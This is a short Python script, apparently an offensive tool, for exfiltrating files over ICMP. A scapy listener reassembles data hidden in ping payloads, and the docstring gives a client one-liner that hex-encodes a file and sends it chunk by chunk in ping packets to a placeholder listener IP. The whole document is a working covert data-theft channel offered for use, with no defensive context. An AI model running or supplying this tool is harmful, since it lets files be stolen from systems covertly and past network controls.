#!/usr/bin/env python3
'''
Exfiltrate files over ICMP.

Run this script as a listener and then execute this command on the client
to exfiltrate data back to the listener.

xxd -p -c 4 filename.txt | while read line; do ping -c 1 -p $line xx.xx.xx.xx; done
'''
from scapy.all import *

def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(data.decode("utf-8"), flush=True, end='')

sniff(prn=process_packet)
